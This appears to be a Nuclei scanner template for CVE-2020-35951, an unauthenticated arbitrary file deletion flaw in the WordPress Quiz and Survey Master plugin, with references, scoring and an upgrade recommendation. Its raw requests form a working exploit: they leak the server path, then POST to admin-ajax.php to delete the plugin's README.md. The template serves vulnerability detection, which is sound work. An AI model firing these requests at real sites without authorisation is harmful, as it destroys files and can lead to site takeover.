id: CVE-2020-35951
info:
  name: Wordpress Quiz and Survey Master <7.0.1 - Arbitrary File Deletion
  author: princechaddha
  severity: critical
  description: The CVE-2020-35951 vulnerability in Wordpress Quiz and Survey Master
    <7.0.1 allows unauthorized deletion of arbitrary files, risking complete site
    shutdown and putting the attacker in control.
  reference:
  - https://www.wordfence.com/blog/2020/08/critical-vulnerabilities-patched-in-quiz-and-survey-master-plugin/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-35951
  - https://wpscan.com/vulnerability/10348
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H
    cvss-score: 9.9
    cve-id: CVE-2020-35951
    cwe-id: CWE-306
  tags: cve2020,wordpress,wp-plugin,wpscan,cve
  metadata:
    impact: The impact of CVE-2020-35951 in Wordpress Quiz and Survey Master <7.0.1
      can potentially lead to a complete takeover of a website by allowing attackers
      to delete critical files such as the wp-config.php file.
    recommendation: It is strongly recommended to update Wordpress Quiz and Survey
      Master to version 7.0.1 or higher to prevent the possibility of arbitrary file
      deletion and unauthorized access to websites.
requests:
- raw:
  - 'GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBJ17hSJBjuGrnW92



    ------WebKitFormBoundaryBJ17hSJBjuGrnW92

    Content-Disposition: form-data; name="action"


    qsm_remove_file_fd_question

    ------WebKitFormBoundaryBJ17hSJBjuGrnW92

    Content-Disposition: form-data; name="file_url"


    {{fullpath}}wp-content/plugins/quiz-master-next/README.md

    ------WebKitFormBoundaryBJ17hSJBjuGrnW92--

    '
  - 'GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1

    Host: {{Hostname}}

    '
  extractors:
  - type: regex
    name: fullpath
    internal: true
    part: body
    group: 1
    regex:
    - not found in <b>([/a-z_]+)wp
  req-condition: true
  matchers-condition: and
  matchers:
  - type: word
    words:
    - '{"type":"success","message":"File removed successfully"}'
    part: body
  - type: dsl
    dsl:
    - contains((body_1), '# Quiz And Survey Master') && status_code_4==301 && !contains((body_4),
      '# Quiz And Survey Master')
